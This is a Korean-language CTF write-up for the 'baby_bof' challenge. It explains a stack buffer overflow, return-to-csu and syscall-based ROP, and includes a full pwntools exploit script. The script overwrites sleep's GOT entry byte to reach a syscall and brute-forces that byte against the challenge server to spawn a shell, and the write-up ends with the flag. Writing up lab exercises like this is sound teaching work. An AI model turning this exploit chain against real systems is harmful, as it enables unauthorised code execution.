# Cykor 여름방학 과제

## baby_bof

다운로드 받은 파일의 압축을 풀어보면 baby_bof라는 64비트 실행 파일과, libc파일이 존재한다. 

![](https://user-images.githubusercontent.com/64826730/91281840-812bed00-e7c3-11ea-89cf-200798631ef7.png)

baby_bof를 실행시켜보면 위와 같이 특별한 출력은 하지 않고 입력만 받은 후 프로그램을 종료한다. 

아이다로 확인한 main 함수는 다음과 같다. 

![](https://user-images.githubusercontent.com/64826730/91281847-838e4700-e7c3-11ea-9f66-256a5ae82cea.png)

buf가 rbp-0x10부터 시작하는데 read함수에서 0x50f만큼 읽어오고 있으므로 bof가 발생한다. 

![](https://user-images.githubusercontent.com/64826730/91281860-85f0a100-e7c3-11ea-9f1c-b5ced8c13ef1.png)

NX가 걸려있으므로 쉘코드 삽입은 안되고, 일반적인 ROP를 사용하면 되는 쉬운 문제로 보였으나, 프로그램 안에서 사용할 수 있는 함수가 sleep과 read밖에 없어서 libc_base를 알아낼 방법이 없어서 불가능하다.

바이너리 안에 존재하는 함수 중에 libc_csu_init이 있으므로, 이전에 사용했었던 rtc방법을 사용하였다. 
***
### RTC 

return to csu, 가젯이 충분하지 않은 상황에서 libc_csu_init이 존재하면 사용가능. 
init함수에서 스택에 있는 값을 레지스터에 저장하고, 레지스터를 통해 함수 호출. 스택 통해서 원하는 함수를 호출하도록 할 수 있다. 

![](https://user-images.githubusercontent.com/64826730/91281877-8b4deb80-e7c3-11ea-9697-ee72c7bf8c09.png)

rbx=0, rbp=1  
함수 호출 이후 rbx++와 rbp가 같으면 init함수가 계속해서 실행되도록 해 준다. 즉, 연속해서 cus_init을 호출하기 위해서 무조건 위의 값으로 설정

r12 = 호출하고자 하는 함수의 got

rdi, rsi, r15 = 순서대로 인자 1,2,3 전달

***
### SROP
RTC와 함께 SROP라는 방식도 사용해서 문제를 해결했다. 
SROP는 처음 사용해 봤는데 그동안 ROP에서 사용했던 pppr과 같은 형태의 가젯 대신에 syscall을 사용해서 함수를 호출하는 방법이다. 
32비트의 int 0x80과 비슷한 방식으로 작동하며, 프로그램이 실행중 syscall을 만나면 현재 rax를 참조하여 특정한 함수를 호출한다. 

https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

위 주소에 나와있는 테이블을 참고해서 sys함수를 호출 하면 된다. 

***

페이로드는 다음과 같이 작성했다. 

read(0,binsh_addr,8) : binsh_addr(bss+0x100)에 binsh저장, bss영역은 aslr이 걸려도 고정이다. 
-> read(0,sleep_got,1) : sleep의 실제함수 주소에서 마지막 1바이트만 수정해서 sleep함수를 syscall로 바꿔준다. aslr에서 libc_base만 바뀌고 마지막 1바이트는 offset주소로 항상 일정함을 이용
-> read(0,bss,59) : syscall에서 execve를 호출하기 위해서는 rax=59가 되어야 한다. 현재 바이너리 안에 pop rax가젯이 존재하지 않으므로, read함수는 읽은 바이트 수 만큼 rax에 리턴해주는 것을 이용해서 rax=59로 만들어주기 위한 과정
-> execve(\bin\sh\x00) : sleep함수를 syscall로 바꿔주었고, rax에도 59가 들어가있으므로 syscall을 통해 쉘을 획득 할 수 있다. 

``` python 


from pwn import *

syscall_offset = 0x44   #for bruteforce

for i in range (0,0xff):
    
    syscall_offset+=1
    print(syscall_offset)

    #level 1
    #p = process("./baby_bof")
    p = remote("srv.cykor.kr",31010)

    read_plt = 0x400430
    read_got = 0x601000
    sleep_got = 0x601010
    bss = 0x601028
    csu0 = 0x4005d0     #function call, rdx=r15, rsi=r14, rdi=r13
    csu1 = 0x4005e6     #set up registers, rbx,rbp,r12,r13,r14,r15
    binsh = "/bin/sh\x00"
    binsh_addr = bss+0x100

    #level 2
    #read(0,bss,8) -> read(0,sleep_got,1) -> execve(/bin/sh/x00)

    #read(0,binsh_addr,8)
    payload = "a"*24    #buf + sfp
    payload += p64(csu1)    #set_up regs 
    payload += p64(0)   #dummy 
    payload += p64(0)   #rbx
    payload += p64(1)   #rbp
    payload += p64(read_got)    #r12, func addr to call
    payload += p64(0)   #r13 = rdi = para1
    payload += p64(binsh_addr) #r14 = rsi = para2
    payload += p64(8)   #r15 = rdx = para3
    payload += p64(csu0)    #call func

#read(0,sleep_got,1)
    payload += p64(0)   #dummy 
    payload += p64(0)   
    payload += p64(1)   
    payload += p64(read_got)    
    payload += p64(0)
    payload += p64(sleep_got)
    payload += p64(1)
    payload += p64(csu0)

#read(0,bss+0x100,59)
    payload += p64(0)   #dummy 
    payload += p64(0)
    payload += p64(1)
    payload += p64(read_got)
    payload += p64(0)
    payload += p64(bss)
    payload += p64(59)
    payload += p64(csu0)

#execve(/bin/sh/x00)
    payload += p64(0)   #dummy 
    payload += p64(0)
    payload += p64(1)
    payload += p64(sleep_got)
    payload += p64(binsh_addr)
    payload += p64(0)
    payload += p64(0)
    payload += p64(csu0)


#level 3
    p.sendline(payload)
    sleep(3.2)
    p.send(binsh)
    
    p.send(chr(syscall_offset))
    
    p.sendline('a'*59)
    
    p.interactive()
    
    p.close()

```

sleep의 마지막 바이트를 syscall로 덮어씌우는 부분에서, 로컬에서는 다음사진처럼 0x46 으로 덮어씌우면 쉘을 획득할 수 있었는데 문제 서버에서는 해당 값으로 쉘 획득이 되지 않아서 브루트포싱으로 찾았다. 

![](https://user-images.githubusercontent.com/64826730/91281888-8e48dc00-e7c3-11ea-88d6-f8a721e46bc9.png)

![](https://user-images.githubusercontent.com/64826730/91281888-8e48dc00-e7c3-11ea-88d6-f8a721e46bc9.png)

문제서버에서는 0x45 로 덮어씌우면 쉘을 획득할 수 있었다. 포너블에서도 브루트포싱을 사용하는 방법을 좀 더 찾아볼 필요가 있어 보인다. 

![](https://user-images.githubusercontent.com/64826730/91281897-90129f80-e7c3-11ea-965e-087f774e6aaa.png)

flag : cykor{D1d_y0u_s0lv3d_17_w1th_R37urn_t0_c5u??}